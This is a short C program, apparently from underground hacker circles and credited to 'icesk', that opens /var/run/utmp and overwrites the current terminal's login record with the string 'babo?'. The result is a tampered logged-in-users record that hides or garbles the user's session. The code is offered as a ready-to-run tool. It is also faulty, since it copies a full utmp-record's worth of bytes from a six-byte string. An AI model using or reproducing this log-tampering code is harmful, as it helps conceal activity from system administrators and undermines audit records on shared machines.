/* thiz is by icesk, replaces your tty name with 'babo?' heh! */
#include <fcntl.h>
#include <utmp.h>
#include <sys/types.h>
#include <unistd.h>
main() {
  char *me;
  struct utmp ud;
  int fd, size;

  me = (char *)(ttyname(0)+5);
  size = sizeof(struct utmp);
  printf("icesk; tty: %s\n", me);

  fd = open("/var/run/utmp", O_RDWR);
  while(read(fd, &ud, size) == size) {
    if(strstr(ud.ut_line, me) != NULL) {
      lseek(fd, -1*size, SEEK_CUR);
      write(fd, "babo?", size);
      exit(-1);
    }
  }
}
